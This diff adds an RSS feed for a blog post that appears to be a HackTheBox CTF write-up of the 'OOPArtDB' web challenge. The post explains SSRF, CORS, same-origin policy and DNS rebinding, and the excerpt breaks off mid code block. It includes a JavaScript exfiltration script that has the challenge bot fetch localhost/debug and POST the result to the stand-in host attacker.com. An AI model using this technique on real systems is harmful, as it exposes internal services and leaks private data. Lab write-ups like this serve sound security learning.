@@ -1,0 +1,490 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Insane on Kvn11</title><link>https://Kvn11.github.io/tags/insane/</link><description>Recent content in Insane on Kvn11</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 20 Feb 2024 02:45:01 -0700</lastBuildDate><atom:link href="https://Kvn11.github.io/tags/insane/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB Insane Web OOPArtDB</title><link>https://Kvn11.github.io/p/htb-insane-web-oopartdb/</link><pubDate>Tue, 20 Feb 2024 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/htb-insane-web-oopartdb/</guid><description>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/hackthebox.jpg" alt="Featured image of post HTB Insane Web OOPArtDB" />&lt;h2 id="intro">Intro
+&lt;/h2>&lt;p>This challenge allows you to submit a URL to be &amp;ldquo;scanned&amp;rdquo; by a bot on the challenge server.
+The flag is shown in the webapp once you have successfully accessed the appropriate page with the credentials of the &amp;ldquo;Overseer&amp;rdquo; user.&lt;/p>
+&lt;h2 id="foothold">Foothold
+&lt;/h2>&lt;p>One of the first things I noticed in the source code, was the &lt;code>/debug&lt;/code> and &lt;code>/register&lt;/code> endpoint.
+The &lt;code>/debug&lt;/code> endpoint caught my attention because it could reveal the secret &lt;code>REFERRAL_TOKEN&lt;/code> value which is required to register via &lt;code>/register&lt;/code> as the higher privilege &lt;code>researcher&lt;/code> type of user.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// challenge/index.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/debug&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">util&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isLocalhost&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">utils&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;util&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">end&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Object&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getOwnPropertyNames&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">global&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">map&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="sb">`&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">:\n&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nx">utils&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">inspect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">global&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;\n\n&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>When accessed via a GET request from localhost, it responds with a detailed inspection of all properties of the global object in Node.js.
+It&amp;rsquo;s a way to inspect the global environment for debugging purposes.
+In all honesty, at this point I couldn&amp;rsquo;t see how I could leverage this to get the flag, but it seemed like a good step up since I was obtaining higher permissions.
+This is probably something I need to work on for the future.
+This is clearly SSRF, but we can&amp;rsquo;t see the output of the response, so we also need to combine it with a way to exfiltrate the response.
+So then my next thought was to submit a URL I control.
+The URL will contain a webpage that contains a script that will make a request to the &lt;code>/debug&lt;/code> endpoint, and then submit the response from that request back to my own web server.&lt;/p>
+&lt;p>I hosted a web page on an EC2 instance, and had the following script run on it:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span> &lt;span class="nx">fetchData&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://localhost/debug&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ok&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Network response was not ok&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">text&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="c1">// Return the response as text
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Error fetching data:&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Function to send a POST request to `http://attacker.com/` with the fetched data after a delay of 3 seconds
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">sendDataWithDelay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://attacker.com/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">method&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headers&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;Content-Type&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;text/plain&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">body&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">data&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ok&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Network response was not ok&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Data sent successfully&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Error sending data:&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span> &lt;span class="mi">3000&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Delay of 3 seconds (3000 milliseconds)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Usage: Fetch data and then send it after a delay of 3 seconds
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fetchData&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">sendDataWithDelay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This somewhat worked, but I wasn&amp;rsquo;t able to receive the request to exfil.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2.png"
+width="681"
+height="54"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="First request received"
+class="gallery-image"
+data-flex-grow="1261"
+data-flex-basis="3026px"
+>&lt;/p>
+&lt;p>This request could have gotten blocked due to the CORS policy, and upon some research it seemed that &lt;code>http.server&lt;/code> does not allow controlling the &lt;code>CORS&lt;/code> header from the commandline.
+However, it is possible with a little scripting and help from &lt;a class="link" href="https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server" target="_blank" rel="noopener"
+>stackoverflow&lt;/a>&lt;/p>
+&lt;p>Then we can verify it worked with burpsuite.
+I blurred out the IP address of my EC2 instance since I don&amp;rsquo;t want it getting touched :).&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3.png"
+width="991"
+height="344"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Initial Request"
+class="gallery-image"
+data-flex-grow="288"
+data-flex-basis="691px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4.png"
+width="588"
+height="195"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Response with CORS policy"
+class="gallery-image"
+data-flex-grow="301"
+data-flex-basis="723px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5.png"
+width="944"
+height="367"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Request to /debug"
+class="gallery-image"
+data-flex-grow="257"
+data-flex-basis="617px"
+> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6.png"
+width="550"
+height="103"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Request to /debug received"
+class="gallery-image"
+data-flex-grow="533"
+data-flex-basis="1281px"
+>&lt;/p>
+&lt;p>However, the POST request never went out.
+This was again due to the CORS policy on my local &lt;code>http.server&lt;/code> not havint the correct value, which then made me look into what the CORS and CSP policy was on the actual challenge.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">use&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// no XSS or iframing :&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Content-Security-Policy&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sb">`
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> default-src &amp;#39;self&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> style-src &amp;#39;self&amp;#39; https://fonts.googleapis.com;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> font-src https://fonts.gstatic.com;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> object-src &amp;#39;none&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> base-uri &amp;#39;none&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> frame-ancestors &amp;#39;none&amp;#39;;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> `&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">trim&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/\s+/g&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;X-Frame-Options&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;DENY&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">next&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>I couldn&amp;rsquo;t find anything to indicate what the CORS policy was so I assumed it was set as the default Same Origin Policy.
+My testing also implied this, so now is the time to think of how to bypass it.&lt;/p>
+&lt;h3 id="cors">CORS
+&lt;/h3>&lt;p>CORS is a policy defined by the web server that determines what requests it will accept.
+If you intercept a response from a web server with a CORS policy you will see the header:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Access-Control-Allow-Origin: *
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>This header can have multiple values to specify multiple domains, or a wildcard as shown above, or a &lt;code>null&lt;/code> value.
+It makes sense too because a site that holds private information probably doesn&amp;rsquo;t want to share information to applications outside of its domain.
+Anyways, there are 2 parts to CORS.
+There is a preflight request that happens from the client to the web server to ensure that the cross-site request is allowed, and then the actual request.
+However these only happen when non-standard requests are made I think, or when you need to read the headers or data of the response (TODO: Verify this)&lt;/p>
+&lt;h3 id="sop">SOP
+&lt;/h3>&lt;p>Same Origin Policy is similar to CORS, but it is enforced by the browser.
+This policy just makes it so that a client can only request resources from the same origin, that is the same: &lt;strong>protocal&lt;/strong>, &lt;strong>domain&lt;/strong>, and &lt;strong>port&lt;/strong>.
+For example: a request from &lt;a class="link" href="https://foo.com" target="_blank" rel="noopener"
+>https://foo.com&lt;/a> to &lt;a class="link" href="http://foo.com" target="_blank" rel="noopener"
+>http://foo.com&lt;/a> wouldn&amp;rsquo;t work because there is a different protocol between the two addresses.&lt;/p>
+&lt;h3 id="bypass-1">Bypass 1
+&lt;/h3>&lt;p>So the problem here is that our site, lets call it &lt;code>http://attacker.com&lt;/code> is trying to make a request to &lt;code>http://localhost/debug&lt;/code>, but because the domain, and the port are different then the request is not allowed by the bot&amp;rsquo;s browser.&lt;/p>
+&lt;p>And our goal is for the bot to visit our page, our page sends a request to the local server address of the challenge site, and then our page posts that request to us at another endpoint.&lt;/p>
+&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7.png"
+width="681"
+height="580"
+srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="The problem becomes obvious"
+class="gallery-image"
+data-flex-grow="117"
+data-flex-basis="281px"
+>&lt;/p>
+&lt;p>Enter DNS Rebind.
+While searching for bypasses on hacktricks, I came across this method.
+The attack relies on changing the IP address for a domain (rebinding it), very quickly, sort of like a race condition.
+How does that help us here?
+Well in the source code for the bot, we can see that it doensn&amp;rsquo;t perform all its actions immediately, there are delays.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
